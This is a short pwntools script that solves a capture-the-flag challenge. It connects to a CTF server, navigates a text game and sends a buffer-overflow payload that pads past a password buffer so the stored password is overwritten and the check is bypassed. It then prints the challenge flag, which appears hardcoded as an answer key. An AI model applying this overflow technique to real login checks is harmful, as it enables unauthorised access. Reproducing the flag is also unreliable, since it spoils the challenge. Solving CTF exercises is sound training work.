from pwn import *

prc = remote("bin.magpiectf.ca", "1976")

padding = b"a" * 248
password = b"password1\0"
fakepass = b"password1"

payload = password + padding + fakepass

prc.recvline()
prc.recvline()

prc.sendline(b"go north")

prc.recvline()

prc.sendline(b"go west")

prc.recvline()

prc.sendline(b"use terminal")

prc.recvline()

prc.sendline(payload)

prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
prc.recvline()
flag = prc.recvline().decode("utf-8").rstrip()
flag = flag.split(" ")[3]

print(flag)

if flag == "magpie{d()nt_p@n!k_pIz}":
    print(True)
